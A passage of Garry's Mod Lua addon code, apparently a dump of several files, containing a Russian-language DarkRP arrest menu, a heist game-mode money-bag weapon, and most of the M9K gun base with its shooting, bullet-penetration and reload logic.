			draw.RoundedBox(BORDER * 4,0,0,w,h,self:IsHovered() and Color( 50, 50, 50) or Color( 25, 25, 25))
		end

		draw.SimpleText("Тяжёлая","MB_20",w * 0.5, h * 0.5,Color(200,200,200),TEXT_ALIGN_CENTER,TEXT_ALIGN_BOTTOM)
		draw.SimpleText(tostring(DarkRP.arrestDuration[2]) .. " секунд","M_20",w * 0.5, h * 0.5 + ScreenScale(1),Color(165,165,165),TEXT_ALIGN_CENTER,TEXT_ALIGN_TOP)
	end

	local function selectLevel(lvl)
		selectedLevel = lvl
	end
	
	function lowArrest:DoClick()
		selectLevel(0)
	end

	function midArrest:DoClick()
		selectLevel(1)
	end

	function highArrest:DoClick()
		selectLevel(2)
	end

	local arrestButton = arrestMenu:Add("DButton")
	arrestButton:SetText("Арестовать")
	arrestButton:SetFont("MB_25")
	arrestButton:SetSize(arrestMenu:GetWide() - OFFSET * 2,ScreenScale(15))
	arrestButton:SetColor(color_white)
	arrestButton:SetPos(arrestMenu:GetWide() * 0.5 - arrestButton:GetWide() * 0.5,arrestMenu:GetTall() - arrestButton:GetTall() - OFFSET)
	function arrestButton:Paint(w,h)
		draw.RoundedBox(BORDER * 4,0,0,w,h,self:IsHovered() and Color( 55, 121, 251) or Color( 0, 117, 223))
	end

	function arrestButton:DoClick()
		net.Start("darkrp_arrest")
		net.WritePlayer(ply)
		net.WriteUInt(selectedLevel,2)
		net.SendToServer()

		arrestMenu:Remove()
	end

	selectLevel(0)
end

net.Receive("darkrp_arrest",function(_)
	local ply = net.ReadPlayer()

	if IsValid( ply ) then
		DarkRP.openArrestMenu( ply )
	end
end)

--PATH addons/_gmbheist/lua/weapons/bag_money.lua:
AddCSLuaFile()

SWEP.Base = "weapon_base"

if CLIENT then
    SWEP.PrintName 					= "Сумка"
    SWEP.Slot 						= 4
    SWEP.SlotPos 					= 2
end

SWEP.DrawAmmo 					= false
SWEP.DrawCrosshair 				= false


SWEP.Instructions				= "ЛКМ- Положить деньги из сейфа."


SWEP.ViewModel 					= Model('models/weapons/v_hands.mdl')
SWEP.WorldModel					= ""

SWEP.ViewModelFOV 				= 62
SWEP.ViewModelFlip 				= false

SWEP.Spawnable 					= true
SWEP.AdminSpawnable = true
SWEP.Category 					= "GambitHeist"
SWEP.DrawAmmo       = false
SWEP.Primary.ClipSize		= -1
SWEP.Primary.DefaultClip	= -1
SWEP.Primary.Automatic		= true
SWEP.Primary.Ammo			= "none"

SWEP.Secondary.ClipSize		= -1
SWEP.Secondary.DefaultClip	= -1
SWEP.Secondary.Automatic	= false
SWEP.Secondary.Ammo			= "none"


if CLIENT then
    hook.Add("HUDPaint", "Bag_hud", function()
    	 local x, y = ScrW(), ScrH()
        local activeweapon = LocalPlayer():GetActiveWeapon()
        if IsValid(activeweapon) and activeweapon:GetClass() == "bag_money" then
            draw.SimpleTextOutlined( 'Сумка: '..activeweapon:GetMoney().."/5", 'travka.btn', x- 10, y - 50, Color(255,155,55), TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER, 1, Color(0,0,0,140))
        end
    end)
end

function SWEP:SetupDataTables()
	self:NetworkVar("Int", 0, "Money")
end

if CLIENT then return end

function SWEP:Initialize()
    self.pnextattack = CurTime()
    self.snextattack = CurTime()
    self:SetMoney(0)
end

function SWEP:PrimaryAttack()
    local trc = self.Owner:GetEyeTrace()
    if not trc then return end
    if IsEntity(trc.Entity) and trc.Entity:GetClass() == "gmb_bank" and trc.HitPos:Distance(self.Owner:GetShootPos()) < 70 then
    	local activeweapon = self.Owner:GetActiveWeapon()
    	if trc.Entity:GetNW2Int("vaultStatus") != 1 then self.Owner:svtext(Color(255,155,55),'[GambitHeist] ',Color(255,255,255),'Для начала вам нужно начать ограбление!') return end
    	if activeweapon:GetMoney() > 4 then self.Owner:svtext(Color(255,155,55),'[GambitHeist] ',Color(255,255,255),'У вас уже больше 5 пачек денег!') return end
    	if self.Owner:GetNW2Int('gmbheits_cooldown') > CurTime() then self.Owner:svtext(Color(255,155,55),'[GambitHeist] ',Color(255,255,255),'Вы не можете так быстро накладывать деньги полождите '..math.Round(self.Owner:GetNW2Int('gmbheits_cooldown') - CurTime())..' секунд!') return end
    	self.Owner:SetNW2Int('gmbheits_cooldown', CurTime() + 10)
    	activeweapon:SetMoney(activeweapon:GetMoney() + 1)
    	self.Owner:svtext(Color(255,155,55),'[GambitHeist] ',Color(255,255,255),'Вы положили одну пачку денег всего ( '..activeweapon:GetMoney()..'/5 )')
    end
end

function SWEP:SecondaryAttack()
    local trc = self.Owner:GetEyeTrace()
    if not trc then return end
    if IsEntity(trc.Entity) and trc.Entity:GetClass() == "gmb_robber" and trc.HitPos:Distance(self.Owner:GetShootPos()) < 70 then
    	local activeweapon = self.Owner:GetActiveWeapon()
    	local babosi = activeweapon:GetMoney() * 10000
    	if activeweapon:GetMoney() == 0 then self.Owner:svtext(Color(255,155,55),'[GambitHeist] ',Color(255,255,255),'В сумке нету денег!') return end
    	self.Owner:svtext(Color(255,155,55),'[GambitHeist] ',Color(255,255,255),'Вы доставили сумку с деньгами ( '..activeweapon:GetMoney()..'/5 )',Color(40,255,40),' +'..babosi)
    	self.Owner:addMoney(babosi)
		BPSetTask( 'SellNpc', self.Owner, 20, activeweapon:GetMoney() )
    	activeweapon:SetMoney(0)
    	self.Owner:StripWeapon('bag_money')
    end
end

--PATH addons/m9k/lua/weapons/bobs_gun_base/shared.lua:
-- //Не забудь поблагодарить за настройку гамбит
SWEP.Category                           = ""
SWEP.Gun                                        = ""
SWEP.Author                             = "Generic Default, Worshipper, Clavus, and Bob"
SWEP.Contact                            = ""
SWEP.Purpose                            = ""
SWEP.Instructions                               = ""
SWEP.MuzzleAttachment                   = "1"           -- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.DrawCrosshair                      = true          -- Hell no, crosshairs r 4 nubz!
SWEP.ViewModelFOV                       = 65            -- How big the gun will look
SWEP.ViewModelFlip                      = true          -- True for CSS models, False for HL2 models
 
SWEP.Spawnable                          = false
SWEP.AdminSpawnable                     = false
 
SWEP.Primary.Sound                      = Sound("")                             -- Sound of the gun
SWEP.Primary.Round                      = ("")                                  -- What kind of bullet?
SWEP.Primary.Cone                       = 0.2                                   -- Accuracy of NPCs
SWEP.Primary.Recoil             = 10
SWEP.Primary.Damage             = 10
SWEP.Primary.Spread             = .01                                   --define from-the-hip accuracy (1 is terrible, .0001 is exact)
SWEP.Primary.NumShots   = 1
SWEP.Primary.RPM                                = 0                                     -- This is in Rounds Per Minute
SWEP.Primary.ClipSize                   = 0                                     -- Size of a clip
SWEP.Primary.DefaultClip                        = 0                                     -- Default number of bullets in a clip
SWEP.Primary.KickUp                     = 0                                     -- Maximum up recoil (rise)
SWEP.Primary.KickDown                   = 0                                     -- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal                     = 0                                     -- Maximum side recoil (koolaid)
SWEP.Primary.Automatic                  = true                                  -- Automatic/Semi Auto
SWEP.Primary.Ammo                       = "none"                                        -- What kind of ammo
 
-- SWEP.Secondary.ClipSize                 = 0                                     -- Size of a clip
-- SWEP.Secondary.DefaultClip                      = 0                                     -- Default number of bullets in a clip
-- SWEP.Secondary.Automatic                        = false                                 -- Automatic/Semi Auto
SWEP.Secondary.Ammo                     = ""
--//HAHA! GOTCHA, YA BASTARD!

-- SWEP.Secondary.IronFOV                  = 0                                     -- How much you 'zoom' in. Less is more!
 
SWEP.Penetration                = true
SWEP.BoltAction                 = false
SWEP.Scoped                             = false
SWEP.ShellTime                  = .35
SWEP.Tracer                             = 0    
SWEP.CanBeSilenced              = false
SWEP.Silenced                   = false
SWEP.NextSilence                = 0
SWEP.SelectiveFire              = false
SWEP.NextFireSelect             = 0
SWEP.OrigCrossHair = true
 
local PainMulti = 1
 
if GetConVar("M9KDamageMultiplier") == nil then
		PainMulti = 1
		print("M9KDamageMultiplier is missing! You may have hit the lua limit! Reverting multiplier to 1.")
else
		PainMulti = GetConVar("M9KDamageMultiplier"):GetFloat()
		if PainMulti < 0 then
				PainMulti = PainMulti * -1
				print("Your damage multiplier was in the negatives. It has been reverted to a positive number. Your damage multiplier is now "..PainMulti)
		end
end
 
function NewM9KDamageMultiplier(cvar, previous, new)
		print("multiplier has been changed ")
		if GetConVar("M9KDamageMultiplier") == nil then
				PainMulti = 1
				print("M9KDamageMultiplier is missing! You may have hit the lua limit! Reverting multiplier to 1, you will notice no changes.")
		else
				PainMulti = GetConVar("M9KDamageMultiplier"):GetFloat()
				if PainMulti < 0 then
						PainMulti = PainMulti * -1
						print("Your damage multiplier was in the negatives. It has been reverted to a positive number. Your damage multiplier is now "..PainMulti)
				end
		end
end
cvars.AddChangeCallback("M9KDamageMultiplier", NewM9KDamageMultiplier)
 
function NewDefClips(cvar, previous, new)
		print("Default clip multiplier has changed. A server restart will be required for these changes to take effect.")
end
cvars.AddChangeCallback("M9KDefaultClip", NewDefClips)
 
if GetConVar("M9KDefaultClip") == nil then
		print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
		if GetConVar("M9KDefaultClip"):GetInt() >= 0 then
				print("M9K Weapons will now spawn with "..GetConVar("M9KDefaultClip"):GetFloat().." clips.")
		else
				print("Default clips will be not be modified")
		end
end
 
SWEP.IronSightsPos = Vector (2.4537, 1.0923, 0.2696)
SWEP.IronSightsAng = Vector (0.0186, -0.0547, 0)
 
SWEP.VElements = {}
SWEP.WElements = {}
 
function SWEP:Initialize()
		self.Reloadaftershoot = 0                               -- Can't reload when firing
		self:SetHoldType(self.HoldType)
		self.OrigCrossHair = self.DrawCrosshair
		if SERVER and self.Owner:IsNPC() then
				self:SetNPCMinBurst(3)                 
				self:SetNPCMaxBurst(10)                 -- None of this really matters but you need it here anyway
				self:SetNPCFireRate(1/(self.Primary.RPM/60))   
				-- //self:SetCurrentWeaponProficiency( WEAPON_PROFICIENCY_VERY_GOOD )
		end
	   
		if CLIENT then
	   
				-- // Create a new table for every weapon instance
				self.VElements = table.FullCopy( self.VElements )
				self.WElements = table.FullCopy( self.WElements )
				self.ViewModelBoneMods = table.FullCopy( self.ViewModelBoneMods )
 
				self:CreateModels(self.VElements) -- create viewmodels
				self:CreateModels(self.WElements) -- create worldmodels
			   
				-- // init view model bone build function
				if IsValid(self.Owner) and self.Owner:IsPlayer() then
				if self.Owner:Alive() then
						local vm = self.Owner:GetViewModel()
						if IsValid(vm) then
								self:ResetBonePositions(vm)
								-- // Init viewmodel visibility
								if (self.ShowViewModel == nil or self.ShowViewModel) then
										vm:SetColor(Color(255,255,255,255))
								else
										-- // however for some reason the view model resets to render mode 0 every frame so we just apply a debug material to prevent it from drawing
										vm:SetMaterial("Debug/hsv")                    
								end
						end
					   
				end
				end
			   
		end
	   
		if CLIENT then
				local oldpath = "vgui/hud/name" -- the path goes here
				local newpath = string.gsub(oldpath, "name", self.Gun)
				self.WepSelectIcon = surface.GetTextureID(newpath)
		end
	   
end
 
function SWEP:Equip()
		self:SetHoldType(self.HoldType)
end
 
function SWEP:Deploy()
		self:SetIronsights(false, self.Owner)                                   -- Set the ironsight false
		self:SetHoldType(self.HoldType)
	   
		if self.Silenced then
		self.Weapon:SendWeaponAnim( ACT_VM_DRAW_SILENCED )
		else
		self.Weapon:SendWeaponAnim( ACT_VM_DRAW )
		end
 
		self.Weapon:SetNWBool("Reloading", false)
	   
		if !self.Owner:IsNPC() and self.Owner != nil then
				if self.ResetSights and self.Owner:GetViewModel() != nil then
						self.ResetSights = CurTime() + self.Owner:GetViewModel():SequenceDuration()
				end
		end
		return true
end
 
function SWEP:Holster()
	   
		if CLIENT and IsValid(self.Owner) and not self.Owner:IsNPC() then
				local vm = self.Owner:GetViewModel()
				if IsValid(vm) then
						self:ResetBonePositions(vm)
				end
		end
	   
		return true
end
 
function SWEP:OnRemove()
 
		if CLIENT and IsValid(self.Owner) and not self.Owner:IsNPC() then
				local vm = self.Owner:GetViewModel()
				if IsValid(vm) then
						self:ResetBonePositions(vm)
				end
		end
 
end
 
function SWEP:GetCapabilities()
		return CAP_WEAPON_RANGE_ATTACK1, CAP_INNATE_RANGE_ATTACK1
end
 
function SWEP:Precache()
		util.PrecacheSound(self.Primary.Sound)
		util.PrecacheModel(self.ViewModel)
		util.PrecacheModel(self.WorldModel)
end
 
function SWEP:PrimaryAttack()
	OkaySoFar = true
	if not IsValid(self) then 
		OkaySoFar = false
	else if not IsValid(self.Weapon) then 
		OkaySoFar = false
	else if not IsValid(self.Owner) then
		OkaySoFar = false
	end	end	end
	
	if not OkaySoFar then return end
	
	if self:CanPrimaryAttack() and self.Owner:IsPlayer() then
		if ( !self.Owner:KeyDown(IN_SPEED) or self.Owner:GetNW2Bool("donate_upgrade_runngun") ) and !self.Owner:KeyDown(IN_RELOAD) then
				self:ShootBulletInformation()
				self.Weapon:TakePrimaryAmmo(1)
			   
				if self.Silenced then
						self.Weapon:SendWeaponAnim( ACT_VM_PRIMARYATTACK_SILENCED )
						self.Weapon:EmitSound(self.Primary.SilencedSound)
				else
						self.Weapon:SendWeaponAnim( ACT_VM_PRIMARYATTACK )
						self.Weapon:EmitSound(self.Primary.Sound)
				end    
	   
				local fx                = EffectData()
				fx:SetEntity(self.Weapon)
				fx:SetOrigin(self.Owner:GetShootPos())
				fx:SetNormal(self.Owner:GetAimVector())
				fx:SetAttachment(self.MuzzleAttachment)
				if GetConVar("M9KGasEffect") != nil then
						if GetConVar("M9KGasEffect"):GetBool() then
								util.Effect("m9k_rg_muzzle_rifle",fx)
						end
				end
				self.Owner:SetAnimation( PLAYER_ATTACK1 )
				self.Owner:MuzzleFlash()
				self.Weapon:SetNextPrimaryFire(CurTime()+1/(self.Primary.RPM/60))
				self:CheckWeaponsAndAmmo()
				if self.BoltAction then self:BoltBack() end
		end
		elseif self:CanPrimaryAttack() and self.Owner:IsNPC() then
				self:ShootBulletInformation()
				self.Weapon:TakePrimaryAmmo(1)
				self.Weapon:SendWeaponAnim( ACT_VM_PRIMARYATTACK )
				self.Weapon:EmitSound(self.Primary.Sound)
				self.Owner:SetAnimation( PLAYER_ATTACK1 )
				self.Owner:MuzzleFlash()
				self.Weapon:SetNextPrimaryFire(CurTime()+1/(self.Primary.RPM/60))
		end
end
 
function SWEP:CheckWeaponsAndAmmo()
		if SERVER and self.Weapon != nil and (GetConVar("M9KWeaponStrip"):GetBool()) then
				if self.Weapon:Clip1() == 0 && self.Owner:GetAmmoCount( self.Weapon:GetPrimaryAmmoType() ) == 0 then
						timer.Simple(.1, function() if SERVER then if not IsValid(self) then return end
								if self.Owner == nil then return end
								self.Owner:StripWeapon(self.Gun)
						end end)
				end
		end
end
 
 
/*---------------------------------------------------------
   Name: SWEP:ShootBulletInformation()
   Desc: This func add the damage, the recoil, the number of shots and the cone on the bullet.
-----------------------------------------------------*/
function SWEP:ShootBulletInformation()
 
		local CurrentDamage
		local CurrentRecoil
		local CurrentCone
		local basedamage
	   
		if (self:GetIronsights() == true) and self.Owner:KeyDown(IN_ATTACK2) then
		CurrentCone = self.Primary.IronAccuracy
		else
		CurrentCone = self.Primary.Spread
		end
		-- local damagedice = math.Rand(.85,1.3)
	   
		-- basedamage = PainMulti * self.Primary.Damage
		-- CurrentDamage = basedamage * damagedice
		basedamage = self.Primary.Damage
		CurrentDamage = basedamage
		
		CurrentRecoil = self.Primary.Recoil
	   
		-- //Player is aiming
		if (self:GetIronsights() == true) and self.Owner:KeyDown(IN_ATTACK2) then
				self:ShootBullet(CurrentDamage, CurrentRecoil / 6, self.Primary.NumShots, CurrentCone)
		-- //Player is not aiming
		else
			if IsValid(self) then
				if IsValid(self.Weapon) then
					if IsValid(self.Owner) then
					self:ShootBullet(CurrentDamage, CurrentRecoil, self.Primary.NumShots, CurrentCone)
					end
				end
			end	
		end
	   
end
 
/*---------------------------------------------------------
   Name: SWEP:ShootBullet()
   Desc: A convenience func to shoot bullets.
-----------------------------------------------------*/
local TracerName = "Tracer"
 
function SWEP:ShootBullet(damage, recoil, num_bullets, aimcone)
 
		num_bullets             = num_bullets or 1
		aimcone                         = aimcone or 0
 
		self:ShootEffects()
 
		if self.Tracer == 1 then
				TracerName = "Ar2Tracer"
		elseif self.Tracer == 2 then
				TracerName = "AirboatGunHeavyTracer"
		else
				TracerName = "Tracer"
		end
	   
		local bullet = {}
				bullet.Num              = num_bullets
				bullet.Src              = self.Owner:GetShootPos()                      -- Source
				bullet.Dir              = self.Owner:GetAimVector()                     -- Dir of bullet
				bullet.Spread   = Vector(aimcone, aimcone, 0)                   -- Aim Cone
				bullet.Tracer   = 3                                                     -- Show a tracer on every x bullets
				bullet.TracerName = TracerName
				bullet.Force    = damage * 0.25                                 -- Amount of force to give to phys objects
				bullet.Damage   = damage
				
				bullet.Callback = function(attacker, tracedata, dmginfo)	
					local entm = tracedata.Entity:GetClass()
					if entm != "bs_shield" and entm != "bs_hshield" and entm != "bs_rshield" and entm != "bs_dshield" then
						return self:RicochetCallback(0, attacker, tracedata, dmginfo)
					end
				end
				
				-- bullet.Callback = function(attacker, tracedata, dmginfo)	   
										-- return self:RicochetCallback(0, attacker, tracedata, dmginfo)
			    -- end
		if IsValid(self) then
			if IsValid(self.Weapon) then
				if IsValid(self.Owner) then
				self.Owner:FireBullets(bullet)
				end
			end
		end
		-- //if SERVER and !self.Owner:IsNPC() then
		-- //		local anglo = Angle(math.Rand(-self.Primary.KickDown,-self.Primary.KickUp), math.Rand(-self.Primary.KickHorizontal,self.Primary.KickHorizontal), 0)
		-- //		self.Owner:ViewPunch(anglo)
			   
		-- //		local eyes = self.Owner:EyeAngles()
		-- //		eyes.pitch = eyes.pitch + anglo.pitch
		-- //		eyes.yaw = eyes.yaw + anglo.yaw
		-- //		if game.SinglePlayer() then self.Owner:SetEyeAngles(eyes) end
		-- //end
 
		local anglo1 = Angle(math.Rand(-self.Primary.KickDown,-self.Primary.KickUp), math.Rand(-self.Primary.KickHorizontal,self.Primary.KickHorizontal), 0)
		self.Owner:ViewPunch(anglo1)
	   
		if SERVER and game.SinglePlayer() and !self.Owner:IsNPC()  then
				local offlineeyes = self.Owner:EyeAngles()
				offlineeyes.pitch = offlineeyes.pitch + anglo1.pitch
				offlineeyes.yaw = offlineeyes.yaw + anglo1.yaw
				
						self.Owner:SetEyeAngles(offlineeyes)
		end
	   
		if CLIENT and !game.SinglePlayer() and !self.Owner:IsNPC() then
				local anglo = Angle(math.Rand(-self.Primary.KickDown,-self.Primary.KickUp), math.Rand(-self.Primary.KickHorizontal,self.Primary.KickHorizontal), 0)
 
				local eyes = self.Owner:EyeAngles()
				eyes.pitch = eyes.pitch + (anglo.pitch/3)
				eyes.yaw = eyes.yaw + (anglo.yaw/3)
						self.Owner:SetEyeAngles(eyes)
		end
 
end
 
/*---------------------------------------------------------
   Name: SWEP:RicochetCallback()
-----------------------------------------------------*/
 
function SWEP:RicochetCallback(bouncenum, attacker, tr, dmginfo)
	   
		if not IsFirstTimePredicted() then
		return {damage = false, effects = false}
		end
	   
		local PenetrationChecker = false
	   
		if GetConVar("M9KDisablePenetration") == nil then
				PenetrationChecker = false
		else
				PenetrationChecker = GetConVar("M9KDisablePenetration"):GetBool()
		end
	   
		if PenetrationChecker then return {damage = true, effects = DoDefaultEffect} end
 
		bulletmiss = {}
				bulletmiss[1]=Sound("weapons/fx/nearmiss/bulletLtoR03.wav")
				bulletmiss[2]=Sound("weapons/fx/nearmiss/bulletLtoR04.wav")
				bulletmiss[3]=Sound("weapons/fx/nearmiss/bulletLtoR06.wav")
				bulletmiss[4]=Sound("weapons/fx/nearmiss/bulletLtoR07.wav")
				bulletmiss[5]=Sound("weapons/fx/nearmiss/bulletLtoR09.wav")
				bulletmiss[6]=Sound("weapons/fx/nearmiss/bulletLtoR10.wav")
				bulletmiss[7]=Sound("weapons/fx/nearmiss/bulletLtoR13.wav")
				bulletmiss[8]=Sound("weapons/fx/nearmiss/bulletLtoR14.wav")
			   
		local DoDefaultEffect = true
		if (tr.HitSky) then return end
		// -- Can we go through whatever we hit?
		if (self.Penetration) and not ( IsValid(tr.Entity) and tr.Entity:IsPlayer() ) and (self:BulletPenetrate(bouncenum, attacker, tr, dmginfo)) then
				return {damage = true, effects = DoDefaultEffect}
		end

		// -- Your screen will shake and you'll hear the savage hiss of an approaching bullet which passing if someone is shooting at you.
		if (tr.MatType != MAT_METAL) then
				if (SERVER) then
						util.ScreenShake(tr.HitPos, 5, 0.1, 0.5, 64)
						sound.Play(table.Random(bulletmiss), tr.HitPos, 75, math.random(75,150), 1)
				end
 
				if self.Tracer == 0 or self.Tracer == 1 or self.Tracer == 2 then
						local effectdata = EffectData()
								effectdata:SetOrigin(tr.HitPos)
								effectdata:SetNormal(tr.HitNormal)
								effectdata:SetScale(20)
						util.Effect("AR2Impact", effectdata)
				elseif self.Tracer == 3 then
						local effectdata = EffectData()
								effectdata:SetOrigin(tr.HitPos)
								effectdata:SetNormal(tr.HitNormal)
								effectdata:SetScale(20)
						util.Effect("StunstickImpact", effectdata)
				end
 
				return
		end
end
 
 
/*---------------------------------------------------------
   Name: SWEP:BulletPenetrate()
-----------------------------------------------------*/
function SWEP:BulletPenetrate(bouncenum, attacker, tr, paininfo)
 
		local MaxPenetration
 
		if self.Primary.Ammo == "SniperPenetratedRound" then -- .50 Ammo
				MaxPenetration = 20
		elseif self.Primary.Ammo == "pistol" then -- pistols
				MaxPenetration = 9
		elseif self.Primary.Ammo == "357" then -- revolvers with big ass bullets
				MaxPenetration = 12
		elseif self.Primary.Ammo == "smg1" then -- smgs
				MaxPenetration = 14
		elseif self.Primary.Ammo == "ar2" then -- assault rifles
				MaxPenetration = 16
		elseif self.Primary.Ammo == "buckshot" then -- shotguns
				MaxPenetration = 5
		elseif self.Primary.Ammo == "slam" then -- secondary shotguns
				MaxPenetration = 5
		elseif self.Primary.Ammo ==     "AirboatGun" then -- metal piercing shotgun pellet
				MaxPenetration = 17
		else
				MaxPenetration = 14
		end
 
		local DoDefaultEffect = true
		// -- Don't go through metal, sand or player
	   
		if (tr.Entity:GetClass() == "ent_shild") then return end    	  

		// -- Direction (and length) that we are going to penetrate
		local PenetrationDirection = tr.Normal * MaxPenetration
	   
		if (tr.MatType == MAT_GLASS or tr.MatType == MAT_PLASTIC or tr.MatType == MAT_WOOD or tr.MatType == MAT_FLESH  or tr.MatType == MAT_ALIENFLESH) then
				PenetrationDirection = tr.Normal * (MaxPenetration * 2)
		end
			   
		local trace     = {}
		trace.endpos    = tr.HitPos
		trace.start     = tr.HitPos + PenetrationDirection
		trace.mask              = MASK_SHOT
		trace.filter    = {self.Owner}
		   
		local trace     = util.TraceLine(trace)
	   
		// -- Bullet didn't penetrate.
		if (trace.StartSolid or trace.Fraction >= 1.0 or tr.Fraction <= 0.0) then return false end
	   
		// -- Damage multiplier depending on surface
		local fDamageMulti = 0.5
	   
		if self.Primary.Ammo == "SniperPenetratedRound" then
				fDamageMulti = 1
		elseif(tr.MatType == MAT_CONCRETE or tr.MatType == MAT_METAL) then
				fDamageMulti = 0.3
		elseif (tr.MatType == MAT_WOOD or tr.MatType == MAT_PLASTIC or tr.MatType == MAT_GLASS) then
				fDamageMulti = 0.8
		elseif (tr.MatType == MAT_FLESH or tr.MatType == MAT_ALIENFLESH) then
				fDamageMulti = 0.9
		end
	   
		-- local damagedice = math.Rand(.85,1.3)
		-- local newdamage = self.Primary.Damage * damagedice
		local newdamage = self.Primary.Damage
			   
		// -- Fire bullet from the exit point using the original trajectory
		local penetratedbullet = {}
				penetratedbullet.Num            = 1
				penetratedbullet.Src            = trace.HitPos
				penetratedbullet.Dir            = tr.Normal    
				penetratedbullet.Spread         = Vector(0, 0, 0)
				penetratedbullet.Tracer = 2
				penetratedbullet.TracerName     = "m9k_effect_mad_penetration_trace"
				penetratedbullet.Force          = 5
				penetratedbullet.Damage = paininfo:GetDamage() * fDamageMulti
				
		timer.Simple(0, function() if attacker != nil then attacker:FireBullets(penetratedbullet) end end)
 
		return true
end
 
 
function SWEP:SecondaryAttack()
		return false
end
 
function SWEP:Reload()
		if not IsValid(self) then return end if not IsValid(self.Owner) then return end
	   
		if self.Owner:IsNPC() then
				self.Weapon:DefaultReload(ACT_VM_RELOAD)
		return end
	   
		if self.Owner:KeyDown(IN_USE) then return end
	   
		if self.Silenced then
				self.Weapon:DefaultReload(ACT_VM_RELOAD_SILENCED)
		else
				self.Weapon:DefaultReload(ACT_VM_RELOAD)
		end
	   
		if !self.Owner:IsNPC() then
				if self.Owner:GetViewModel() == nil then self.ResetSights = CurTime() + 3 else
				self.ResetSights = CurTime() + self.Owner:GetViewModel():SequenceDuration()
				end
		end
	   
		if SERVER and self.Weapon != nil then
		if ( self.Weapon:Clip1() < self.Primary.ClipSize ) and !self.Owner:IsNPC() then
		-- //When the current clip < full clip and the rest of your ammo > 0, then
				self.Owner:SetFOV( 0, 0.3 )
				-- //Zoom = 0
				self:SetIronsights(false)
				-- //Set the ironsight to false
				self.Weapon:SetNWBool("Reloading", true)
		end
		local waitdammit = (self.Owner:GetViewModel():SequenceDuration())
		timer.Simple(waitdammit + .1,
				function()
				if self.Weapon == nil then return end
				self.Weapon:SetNWBool("Reloading", false)
				if self.Owner:KeyDown(IN_ATTACK2) and self.Weapon:GetClass() == self.Gun then
						if CLIENT then return end
						if self.Scoped == false then
								self.Owner:SetFOV( self.Secondary.IronFOV, 0.3 )
								self.IronSightsPos = self.SightsPos                                     -- Bring it up
								self.IronSightsAng = self.SightsAng                                     -- Bring it up
								self:SetIronsights(true, self.Owner)
								self.DrawCrosshair = false
						else return end
				elseif ( self.Owner:KeyDown(IN_SPEED) and not self.Owner:GetNW2Bool("donate_upgrade_runngun") ) and self.Weapon:GetClass() == self.Gun then
						if self.Weapon:GetNextPrimaryFire() <= (CurTime() + .03) then
								self.Weapon:SetNextPrimaryFire(CurTime()+0.3)                   -- Make it so you can't shoot for another quarter second
						end
						self.IronSightsPos = self.RunSightsPos                                  -- Hold it down
						self.IronSightsAng = self.RunSightsAng                                  -- Hold it down
						self:SetIronsights(true, self.Owner)                                    -- Set the ironsight true
						self.Owner:SetFOV( 0, 0.3 )
				else return end
				end)
		end
end
 
function SWEP:PostReloadScopeCheck()
		if self.Weapon == nil then return end
		self.Weapon:SetNWBool("Reloading", false)
		if self.Owner:KeyDown(IN_ATTACK2) and self.Weapon:GetClass() == self.Gun then
				if CLIENT then return end
				if self.Scoped == false then
						self.Owner:SetFOV( self.Secondary.IronFOV, 0.3 )
						self.IronSightsPos = self.SightsPos                                     -- Bring it up
						self.IronSightsAng = self.SightsAng                                     -- Bring it up
						self:SetIronsights(true, self.Owner)
						self.DrawCrosshair = false
				else return end
		elseif ( self.Owner:KeyDown(IN_SPEED) and not self.Owner:GetNW2Bool("donate_upgrade_runngun") ) and self.Weapon:GetClass() == self.Gun then
				if self.Weapon:GetNextPrimaryFire() <= (CurTime() + .03) then
						self.Weapon:SetNextPrimaryFire(CurTime()+0.3)                           -- Make it so you can't shoot for another quarter second
				end
				self.IronSightsPos = self.RunSightsPos                                  -- Hold it down
				self.IronSightsAng = self.RunSightsAng                                  -- Hold it down
				self:SetIronsights(true, self.Owner)                                    -- Set the ironsight true
				self.Owner:SetFOV( 0, 0.3 )
		else return end
end
 
function SWEP:Silencer()
	   
		if self.NextSilence > CurTime() then return end
	   
		if self.Weapon != nil then
				self.Owner:SetFOV( 0, 0.3 )
				self:SetIronsights(false)
				self.Weapon:SetNWBool("Reloading", true) -- i know we're not reloading but it works
		end
	   
		if self.Silenced then
				self:SendWeaponAnim(ACT_VM_DETACH_SILENCER)
				self.Silenced = false
		elseif not self.Silenced then
				self:SendWeaponAnim(ACT_VM_ATTACH_SILENCER)
				self.Silenced = true
		end
	   
		siltimer = CurTime() + (self.Owner:GetViewModel():SequenceDuration()) + 0.1
		if self.Weapon:GetNextPrimaryFire() <= siltimer then
				self.Weapon:SetNextPrimaryFire(siltimer)
		end
		self.NextSilence = siltimer
	   
		timer.Simple( ((self.Owner:GetViewModel():SequenceDuration()) + 0.1),
				function()
				if self.Weapon != nil then
						self.Weapon:SetNWBool("Reloading", false)
				if self.Owner:KeyDown(IN_ATTACK2) and self.Weapon:GetClass() == self.Gun then
						if CLIENT then return end
						if self.Scoped == false then
								self.Owner:SetFOV( self.Secondary.IronFOV, 0.3 )
								self.IronSightsPos = self.SightsPos                                     -- Bring it up
								self.IronSightsAng = self.SightsAng                                     -- Bring it up
								self:SetIronsights(true, self.Owner)
								self.DrawCrosshair = false
						else return end
				elseif ( self.Owner:KeyDown(IN_SPEED) and not self.Owner:GetNW2Bool("donate_upgrade_runngun") ) and self.Weapon:GetClass() == self.Gun then
						if self.Weapon:GetNextPrimaryFire() <= (CurTime()+0.3) then
								self.Weapon:SetNextPrimaryFire(CurTime()+0.3)                   -- Make it so you can't shoot for another quarter second
						end
						self.IronSightsPos = self.RunSightsPos                                  -- Hold it down
						self.IronSightsAng = self.RunSightsAng                                  -- Hold it down
						self:SetIronsights(true, self.Owner)                                    -- Set the ironsight true
						self.Owner:SetFOV( 0, 0.3 )
				else return end
				end
		end)
 
end
 
function SWEP:SelectFireMode()
 
				if self.Primary.Automatic then
						self.Primary.Automatic = false
						self.NextFireSelect = CurTime() + .5
						if CLIENT then
								self.Owner:PrintMessage(HUD_PRINTTALK, "Semi-automatic selected.")
						end
						self.Weapon:EmitSound("Weapon_AR2.Empty")
				else
						self.Primary.Automatic = true
						self.NextFireSelect = CurTime() + .5
						if CLIENT then
								self.Owner:PrintMessage(HUD_PRINTTALK, "Automatic selected.")
						end
						self.Weapon:EmitSound("Weapon_AR2.Empty")
				end
end
 
 
/*---------------------------------------------------------
IronSight
-----------------------------------------------------*/
function SWEP:IronSight()
    local owner = self:GetOwner()
    if not IsValid(owner) then return end
    local selfTbl = self:GetTable()
